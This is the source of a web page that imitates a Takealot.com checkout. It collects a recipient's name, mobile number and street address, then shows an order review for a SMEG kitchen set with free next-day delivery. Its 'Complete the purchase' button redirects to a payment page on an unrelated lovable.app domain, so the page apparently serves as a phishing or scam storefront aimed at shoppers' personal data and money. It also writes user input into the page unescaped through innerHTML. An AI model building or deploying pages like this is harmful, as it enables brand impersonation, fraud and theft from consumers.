<style>
*{ box-sizing: border-box; margin: 0; padding: 0; }
html, body { height: 100%; }
body{
  font-family: system-ui, -apple-system, Segoe UI, Roboto, Arial, sans-serif;
  background: #fff;
  color: #111;
}

/* ===== TOP BAR ===== */
.topbar{
  background: #fff;
  padding: 14px 0;
  text-align: center;
  border-bottom: 3px solid #0b79d0;
}

.logo-img{
  height: 26px;
  width: auto;
  display: inline-block;
}

/* ===== CONTENT ===== */
.content{
  max-width: 480px;
  margin: 0 auto;
  padding: 24px 16px 40px;
}

.page-title{
  font-size: 22px;
  font-weight: 800;
  color: #111;
  margin-bottom: 16px;
}

/* ===== RESIDENTIAL BUTTON ===== */
.type-toggle{
  display: flex;
  margin-bottom: 24px;
}

.type-btn{
  flex: 1;
  height: 40px;
  border: 2px solid #0b79d0;
  background: #0b79d0;
  color: #fff;
  font-size: 14px;
  font-weight: 600;
  border-radius: 6px;
  cursor: pointer;
  display: flex;
  align-items: center;
  justify-content: center;
}

/* ===== FORM FIELDS ===== */
.field{
  position: relative;
  margin-bottom: 0;
  border-bottom: 1px solid #e0e0e0;
  padding: 18px 0 10px;
}

.field-label{
  display: block;
  font-size: 12px;
  font-weight: 600;
  color: #888;
  margin-bottom: 4px;
  letter-spacing: 0.2px;
}

.field-input{
  width: 100%;
  border: 0;
  outline: none;
  font-size: 15px;
  font-family: inherit;
  color: #333;
  background: transparent;
  padding: 0;
}

.field-input::placeholder{
  color: #ccc;
}

.field-select{
  width: 100%;
  border: 0;
  outline: none;
  font-size: 15px;
  font-family: inherit;
  color: #333;
  background: transparent;
  padding: 0;
  -webkit-appearance: none;
  appearance: none;
  cursor: pointer;
}

/* ===== SAVE BUTTON ===== */
.save-btn{
  width: 100%;
  height: 50px;
  border-radius: 999px;
  border: 0;
  background: #0b79d0;
  color: #fff;
  font-weight: 700;
  font-size: 16px;
  cursor: pointer;
  margin-top: 36px;
  letter-spacing: 0.3px;
}
.save-btn:active{
  transform: scale(.99);
  opacity: .9;
}

/* ===== ORDER REVIEW (hidden by default) ===== */
.order-review{
  display: none;
}

.saved-btn{
  width: 100%;
  height: 50px;
  border-radius: 999px;
  border: 0;
  background: #2fce6b;
  color: #fff;
  font-weight: 700;
  font-size: 16px;
  cursor: default;
  margin-bottom: 28px;
  letter-spacing: 0.3px;
}

.separator{
  border: 0;
  border-top: 1px solid #e0e0e0;
  margin: 0 0 24px;
}

.review-title{
  font-size: 22px;
  font-weight: 800;
  color: #111;
  margin-bottom: 20px;
}

.review-label{
  font-size: 15px;
  font-weight: 700;
  color: #111;
  margin-bottom: 2px;
}

.review-value{
  font-size: 14px;
  color: #444;
  margin-bottom: 16px;
}

.badge-residential{
  display: inline-block;
  background: #333;
  color: #fff;
  font-size: 11px;
  font-weight: 800;
  letter-spacing: 0.5px;
  padding: 4px 10px;
  border-radius: 4px;
  margin-bottom: 6px;
  text-transform: uppercase;
}

.review-home{
  font-size: 15px;
  font-weight: 700;
  color: #111;
  margin-bottom: 2px;
}

.review-address{
  font-size: 14px;
  color: #444;
  margin-bottom: 4px;
  line-height: 1.4;
}

.review-underline{
  width: 20px;
  height: 2px;
  background: #111;
  margin-bottom: 20px;
}

.delivery-date{
  font-size: 15px;
  font-weight: 700;
  color: #111;
  margin-bottom: 2px;
}

.delivery-detail{
  font-size: 14px;
  color: #444;
  margin-bottom: 24px;
}

.items-label{
  font-size: 13px;
  font-weight: 700;
  color: #999;
  letter-spacing: 0.5px;
  text-transform: uppercase;
  margin-bottom: 14px;
}

.item-row{
  display: flex;
  align-items: center;
  gap: 14px;
  padding: 10px 0;
  border-top: 1px solid #eee;
  border-bottom: 1px solid #eee;
  margin-bottom: 28px;
}

.item-img{
  width: 50px;
  height: 50px;
  object-fit: contain;
  border: 1px solid #eee;
  border-radius: 4px;
  flex: 0 0 auto;
}

.item-name{
  font-size: 14px;
  font-weight: 600;
  color: #111;
  line-height: 1.35;
}

.complete-btn{
  width: 100%;
  height: 50px;
  border-radius: 999px;
  border: 0;
  background: #2fce6b;
  color: #fff;
  font-weight: 700;
  font-size: 16px;
  cursor: pointer;
  letter-spacing: 0.3px;
}
.complete-btn:active{
  transform: scale(.99);
  opacity: .9;
}
</style>

<body>

<!-- TOP BAR -->
<div class="topbar">
  <img src="images/logo-takealot.svg" alt="takealot.com" class="logo-img">
</div>

<!-- CONTENT -->
<div class="content">

  <!-- ===== DELIVERY FORM ===== -->
  <div id="formSection">
    <h1 class="page-title">Delivery Details</h1>

    <div class="type-toggle">
      <button class="type-btn" type="button">Residential</button>
    </div>

    <form id="deliveryForm" autocomplete="on">
      <div class="field">
        <label class="field-label" for="recipientName">Recipient Name</label>
        <input class="field-input" type="text" id="recipientName" name="name" autocomplete="name">
      </div>

      <div class="field">
        <label class="field-label" for="recipientMobile">Recipient Mobile Number</label>
        <input class="field-input" type="tel" id="recipientMobile" name="phone" autocomplete="tel">
      </div>

      <div class="field">
        <label class="field-label" for="streetAddress">Street Address</label>
        <input class="field-input" type="text" id="streetAddress" name="street" autocomplete="street-address">
      </div>

      <div class="field">
        <label class="field-label" for="complex">Complex / Building</label>
        <input class="field-input" type="text" id="complex" name="complex" autocomplete="address-line2">
      </div>

      <div class="field">
        <label class="field-label" for="suburb">Suburb</label>
        <input class="field-input" type="text" id="suburb" name="suburb">
      </div>

      <div class="field">
        <label class="field-label" for="city">City / Town</label>
        <input class="field-input" type="text" id="city" name="city" autocomplete="address-level2">
      </div>

      <div class="field">
        <label class="field-label" for="province">Province</label>
        <select class="field-select" id="province" name="province">
          <option value="" selected>Select</option>
          <option value="Eastern Cape">Eastern Cape</option>
          <option value="Free State">Free State</option>
          <option value="Gauteng">Gauteng</option>
          <option value="KwaZulu-Natal">KwaZulu-Natal</option>
          <option value="Limpopo">Limpopo</option>
          <option value="Mpumalanga">Mpumalanga</option>
          <option value="Northern Cape">Northern Cape</option>
          <option value="North West">North West</option>
          <option value="Western Cape">Western Cape</option>
        </select>
      </div>

      <div class="field">
        <label class="field-label" for="postalCode">Postal Code</label>
        <input class="field-input" type="text" id="postalCode" name="postalCode" autocomplete="postal-code" inputmode="numeric">
      </div>

      <button class="save-btn" type="submit">Save</button>
    </form>
  </div>

  <!-- ===== ORDER REVIEW (shown after Save) ===== -->
  <div class="order-review" id="orderReview">

    <button class="saved-btn" type="button">Saved &#10003;</button>

    <hr class="separator">

    <h2 class="review-title">Order Review</h2>

    <div class="review-label">Delivery Method</div>
    <div class="review-value">Delivery</div>

    <div class="review-label">Delivery Address</div>
    <div><span class="badge-residential">RESIDENTIAL</span></div>
    <div class="review-home">Home</div>
    <div class="review-address" id="reviewAddress"></div>
    <div class="review-underline"></div>

    <div class="delivery-date" id="deliveryDate"></div>
    <div class="delivery-detail">Next Business Day Delivery &bull; Free</div>

    <div class="items-label">ITEMS FOR DELIVERY</div>

    <div class="item-row">
      <img class="item-img" src="images/M0.png" alt="SMEG Kitchen Essentials Set">
      <div class="item-name">SMEG Kitchen Essentials Set — Toaster, Kettle & Blender (Black)</div>
    </div>

    <button class="complete-btn" type="button" id="completeBtn">Complete the purchase</button>

  </div>

</div>

<script>
// Calculate tomorrow's date
function getDeliveryDate(){
  var d = new Date();
  d.setDate(d.getDate() + 1);
  var months = ['January','February','March','April','May','June','July','August','September','October','November','December'];
  return d.getDate() + ' ' + months[d.getMonth()] + ' ' + d.getFullYear();
}

document.getElementById('deliveryForm').addEventListener('submit', function(e){
  e.preventDefault();

  // Gather address data
  var street = document.getElementById('streetAddress').value;
  var complex = document.getElementById('complex').value;
  var suburb = document.getElementById('suburb').value;
  var city = document.getElementById('city').value;
  var province = document.getElementById('province').value;
  var postalCode = document.getElementById('postalCode').value;

  // Build address string
  var parts = [];
  if(complex) parts.push(complex);
  if(street) parts.push(street);
  var line2 = [];
  if(suburb) line2.push(suburb);
  if(city) line2.push(city);
  if(province) line2.push(province);
  if(postalCode) line2.push(postalCode);

  var addressHtml = parts.join(', ');
  if(line2.length) addressHtml += '<br>' + line2.join(', ');

  document.getElementById('reviewAddress').innerHTML = addressHtml;
  document.getElementById('deliveryDate').textContent = 'Delivery by ' + getDeliveryDate();

  // Hide form, show order review
  document.getElementById('formSection').style.display = 'none';
  document.getElementById('orderReview').style.display = 'block';

  // Scroll to top
  window.scrollTo(0, 0);
});

// Complete the purchase button
document.getElementById('completeBtn').addEventListener('click', function(){
  window.location.href = 'https://cashpaywld.lovable.app/pay/951f890e-6c3a-4cf3-933d-07492d8bd80f';
});
</script>

</body></html>
